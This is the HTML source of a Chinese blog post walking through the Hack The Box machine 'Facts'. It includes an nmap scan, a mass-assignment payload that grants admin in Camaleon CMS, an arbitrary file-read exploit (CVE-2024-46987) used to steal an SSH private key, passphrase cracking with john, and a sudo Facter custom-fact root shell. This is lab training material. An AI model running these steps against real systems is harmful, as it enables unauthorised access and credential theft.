@@ -1,0 +1,1032 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/colourful.png">
+  <link rel="icon" href="/img/colourful.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="Colourful">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="UserFlag 考点：利用CVE-2024-46987获取ssh私钥登录  先用nmap扫一下 1nmap -A 10.129.19.102   80端口有一个没有重定向的网址，在&#x2F;etc&#x2F;hosts中添加 22端口存在SSH服务 123密钥指纹ECDSA: 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89ED25519: a3:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Facts">
+<meta property="og:url" content="https://colourful228.github.io/2026/04/07/Facts/index.html">
+<meta property="og:site_name" content="Colourful">
+<meta property="og:description" content="UserFlag 考点：利用CVE-2024-46987获取ssh私钥登录  先用nmap扫一下 1nmap -A 10.129.19.102   80端口有一个没有重定向的网址，在&#x2F;etc&#x2F;hosts中添加 22端口存在SSH服务 123密钥指纹ECDSA: 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89ED25519: a3:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194555266.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194558899.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194602052.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194604621.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194607250.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194610504.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194612991.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194615150.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194618979.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194621557.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194624444.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194626516.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194628816.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194631564.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194634188.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194636842.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194639620.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194642056.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194646228.png">
+<meta property="article:published_time" content="2026-04-07T11:51:11.000Z">
+<meta property="article:modified_time" content="2026-04-08T11:46:47.258Z">
+<meta property="article:author" content="Colourful">
+<meta property="article:tag" content="Facts">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://colourful228.github.io/2026/04/07/Facts/image-20260408194555266.png">
+<meta name="twitter:creator" content="@Colorful">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Facts - Colourful</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassbg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"colourful228.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2026-01-09T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+
+    
+
+<style type="text/css">
+  @keyframes spin3D {
+    from {
+      transform: rotate3d(0.5, 0.5, 0.5, 360deg);
+    }
+
+    to {
+      transform: rotate3d(0deg);
+    }
+  }
+
+  #loading {
+    height: 100%;
+    background-color: #172d4781;
+    backdrop-filter: saturate(100%) blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    overflow: hidden;
+    z-index: 99999999;
+  }
+
+  .spinner-box {
+    width: 300px;
+    height: 300px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: transparent;
+  }
+
+  .leo {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+  }
+
+  .blue-orbit {
+    width: 175px;
+    height: 175px;
+    border: 2px solid #1a91fa;
+    animation: spin3D 3s linear .2s infinite;
+  }
+
+  .green-orbit {
+    width: 135px;
+    height: 135px;
+    border: 2px solid #00ffdd;
+    animation: spin3D 2s linear 0s infinite;
+  }
+
+  .red-orbit {
+    width: 100px;
+    height: 100px;
+    border: 2px solid #d75151;
+    animation: spin3D 1s linear 0s infinite;
+  }
+
+  .white-orbit-a {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 3s linear 0s infinite;
+  }
+
+  .white-orbit-b {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 1.5s linear 0s infinite;
+  }
+
+  .nucleus {
+    width: 1px;
+    height: 1px;
+    border: 1px solid #ffffff;
+    animation: spin3D 1s linear 0s infinite;
+  }
+</style>
+
+<div id="loading">
+    <div class="spinner-box">
+        <div class="blue-orbit leo"></div>
+        <div class="green-orbit leo"></div>
+        <div class="red-orbit leo"></div>
+        <div class="white-orbit-a leo"></div>
+        <div class="white-orbit-b leo"></div>
+        <div class="nucleus leo"></div>
+    </div>
+</div>
+
+<script>
+  (function () {
+    const loaded = function () {
+      window.onload = function () {
+        const loader = document.getElementById("loading");
+        loader.className = "fadeout";
+        setTimeout(function () {
+            loader.style.display = "none";
+          },
+                500
+        );
+      }
+    };
+    loaded();
+  })();
+</script>
+
+
+
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Colorful的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/M.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Facts"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Colourful
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-07 19:51" pubdate>
+          2026年4月7日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          788 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          7 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Facts</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2026-04-08T19:46:47+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="UserFlag"><a href="#UserFlag" class="headerlink" title="UserFlag"></a>UserFlag</h1><blockquote>
+<p>考点：利用CVE-2024-46987获取ssh私钥登录</p>
+</blockquote>
+<p>先用nmap扫一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 10.129.19.102<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/07/Facts/image-20260408194555266.png" srcset="/img/loading.gif" lazyload alt="image-20260408194555266"></p>
+<p>80端口有一个没有重定向的网址，在&#x2F;etc&#x2F;hosts中添加</p>
+<p>22端口存在SSH服务</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm">密钥指纹<br><span class="hljs-symbol">ECDSA:</span> <span class="hljs-number">4</span>d:<span class="hljs-built_in">d7</span>:b2:<span class="hljs-number">8</span>c:<span class="hljs-built_in">d4</span>:df:<span class="hljs-number">57</span>:<span class="hljs-number">9</span>c:<span class="hljs-built_in">a4</span>:<span class="hljs-number">2</span>f:df:<span class="hljs-built_in">c6</span>:e3:<span class="hljs-number">01</span>:<span class="hljs-number">29</span>:<span class="hljs-number">89</span><br><span class="hljs-symbol">ED25519:</span> <span class="hljs-built_in">a3</span>:ad:<span class="hljs-number">6</span>b:<span class="hljs-number">2</span>f:<span class="hljs-number">4</span>a:bf:<span class="hljs-number">6</span>f:<span class="hljs-number">48</span>:ac:<span class="hljs-number">81</span>:b9:<span class="hljs-number">45</span>:<span class="hljs-number">3</span>f:de:fb:<span class="hljs-number">87</span><br></code></pre></td></tr></table></figure>
+
+<p>然后扫目录没有扫到什么，尝试一下&#x2F;admin路径，发现了登录界面，注册登录进去（但是dirsearch扫不出来，凭感觉试的&#x2F;admin）</p>
+<p><img src="/2026/04/07/Facts/image-20260408194558899.png" srcset="/img/loading.gif" lazyload alt="image-20260408194558899"></p>
+<p>看到了Camaleon CMS就去搜他存在的漏洞和POC，先是CVE-2025-2304</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 CVE-2025-2304.py -u http://facts.htb -u 12 -p 12<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/07/Facts/image-20260408194602052.png" srcset="/img/loading.gif" lazyload alt="image-20260408194602052"></p>
+<p>尝试了几次，发现每次运行成功后，再想登进去，之前的账户密码就不行了，说明可能不是这个漏洞或者不是用这个POC打</p>
+<p>又看到了另一种提权的方法，注册登录后，在修改密码时拦截抓包</p>
+<p>POC</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">_method=patch&amp;authenticity_token=&lt;TOKEN&gt;&amp;password%5Bpassword%5D=yy&amp;password%5Bpassword_confirmation%5D=yy&amp;password%5Brole%5D=admin<br></code></pre></td></tr></table></figure>
+
+<p>但这里有一个要注意的就是，抓包之后得到的请求包不要发包，加上&amp;password%5Brole%5D&#x3D;admin之后再发包，不然就会像下面p1这样出现302重定向</p>
+<p><img src="/2026/04/07/Facts/image-20260408194604621.png" srcset="/img/loading.gif" lazyload alt="image-20260408194604621"></p>
+<p>这个才是正确的响应</p>
+<p><img src="/2026/04/07/Facts/image-20260408194607250.png" srcset="/img/loading.gif" lazyload alt="image-20260408194607250"></p>
+<p>ok成功了，现在是admin权限了</p>
+<p><img src="/2026/04/07/Facts/image-20260408194610504.png" srcset="/img/loading.gif" lazyload alt="image-20260408194610504"></p>
+<p>发现有很多页面，我也不知道怎么快速信息收集，就用了最朴实的方法，就是每一个都看一遍，就看到有一些是可以发布一些东西的，还有AWS的key感觉有用</p>
+<p><img src="/2026/04/07/Facts/image-20260408194612991.png" srcset="/img/loading.gif" lazyload alt="image-20260408194612991"></p>
+<p>好像对于读userflag也没什么用，又在网上找到了另一个CVE</p>
+<p>CVE-2024-46987：<a target="_blank" rel="noopener" href="https://github.com/Goultarde/CVE-2024-46987/blob/main">https://github.com/Goultarde/CVE-2024-46987/blob/main</a></p>
+<p>payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 CVE-2024-46987.py -u http://facts.htb/ -l 1 -p 1 /etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p>可以实现任意文件的读取，这里看到了有两个用户trivia和william</p>
+<p><img src="/2026/04/07/Facts/image-20260408194615150.png" srcset="/img/loading.gif" lazyload alt="image-20260408194615150"></p>
+<p>尝试利用私钥登录用户，文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jueshijindai/article/details/156168252">https://blog.csdn.net/jueshijindai/article/details/156168252</a></p>
+<p>在网上搜一下私钥存在的位置和文件名，一般是在用户目录的.ssh文件中，文件名一般为</p>
+<p><img src="/2026/04/07/Facts/image-20260408194618979.png" srcset="/img/loading.gif" lazyload alt="image-20260408194618979"></p>
+<p><img src="/2026/04/07/Facts/image-20260408194621557.png" srcset="/img/loading.gif" lazyload alt="image-20260408194621557"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">~<span class="hljs-regexp">/.ssh/i</span>d_rsa.pub  <span class="hljs-comment"># RSA 公钥</span><br>~<span class="hljs-regexp">/.ssh/i</span>d_ed25519.pub  <span class="hljs-comment"># Ed25519 公钥</span><br></code></pre></td></tr></table></figure>
+
+<p>最终可以执行命令，获取trivia用户的私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 CVE-2024-46987.py -u http://facts.htb/ -l 1 -p 123 /home/trivia/.ssh/id_ed25519<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/07/Facts/image-20260408194624444.png" srcset="/img/loading.gif" lazyload alt="image-20260408194624444"></p>
+<p>保存到本地文件中，命名为id_ed25519</p>
+<p><img src="/2026/04/07/Facts/image-20260408194626516.png" srcset="/img/loading.gif" lazyload alt="image-20260408194626516"></p>
+<p>设置权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 id_ed25519<br></code></pre></td></tr></table></figure>
+
+<p>利用ssh登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i id_ed25519 trivia@10.129.244.96<br></code></pre></td></tr></table></figure>
+
+<p>但还是要输入密码</p>
+<p><img src="/2026/04/07/Facts/image-20260408194628816.png" srcset="/img/loading.gif" lazyload alt="image-20260408194628816"></p>
+<p>进行私钥密码爆破</p>
+<p>使用ssh2john将私钥转换为可识别格式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh2john id_ed25519 &gt; key<br></code></pre></td></tr></table></figure>
+
+<p>使用字典攻击破解，可以找一下自己的字典位置，需要先解压一下，（这个要爆破很久</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john --wordlist=/usr/share/wordlists/rockyou.txt key<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/07/Facts/image-20260408194631564.png" srcset="/img/loading.gif" lazyload alt="image-20260408194631564"></p>
+<p>成功爆出key是dragonballz</p>
+<p>然后再去登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i id_ed25519 trivia@10.129.244.96<br><span class="hljs-comment">#key:dragonballz</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/07/Facts/image-20260408194634188.png" srcset="/img/loading.gif" lazyload alt="image-20260408194634188"></p>
+<p>ok成功登进去了，在william目录下找到了user.txt文件，拿到userflag</p>
+<p><img src="/2026/04/07/Facts/image-20260408194636842.png" srcset="/img/loading.gif" lazyload alt="image-20260408194636842"></p>
+<h1 id="RootFlag"><a href="#RootFlag" class="headerlink" title="RootFlag"></a>RootFlag</h1><blockquote>
+<p>考点：sudo权限滥用，利用facter进行提权</p>
+</blockquote>
+<p>然后就是要进行提权，发现可以用sudo权限滥用进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/07/Facts/image-20260408194639620.png" srcset="/img/loading.gif" lazyload alt="image-20260408194639620"></p>
+<p>可以无密码以root权限使用&#x2F;usr&#x2F;bin&#x2F;facter命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">mkdir</span> -p /tmp/rfacts<br><span class="hljs-built_in">cat</span> &gt; /tmp/rfacts/evil.rb &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span><br>Facter.add(<span class="hljs-string">&#x27;evil&#x27;</span>) <span class="hljs-keyword">do</span><br>  setcode <span class="hljs-keyword">do</span><br>    system(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br>  end<br>end<br>EOF<br><span class="hljs-built_in">sudo</span> /usr/bin/facter --custom-dir /tmp/rfacts evil<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/07/Facts/image-20260408194642056.png" srcset="/img/loading.gif" lazyload alt="image-20260408194642056"></p>
+<p>成功提权，就可以读取Rootflag了</p>
+<p><img src="/2026/04/07/Facts/image-20260408194646228.png" srcset="/img/loading.gif" lazyload alt="image-20260408194646228"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F/HTB/" class="category-chain-item">HTB</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Facts/" class="print-no-link">#Facts</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Facts</div>
+      <div>https://colourful228.github.io/2026/04/07/Facts/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Colourful</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月7日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年4月8日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/06/TwoMillion/" title="TwoMillion">
+                        <span class="hidden-mobile">TwoMillion</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://imagegoo-twikoo.hf.space","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+    <div>
+        <span id="timeDate">正在载入天数...</span>
+        <span id="times">载入时分秒...</span>
+        <script>
+          var now = new Date();
+          function createtime(){
+            var grt= new Date("01/09/2026 00:00:00");
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+              mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+              snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+            document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+          }
+          setInterval("createtime()",250);
+        </script>
+    </div>
+
+
+
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
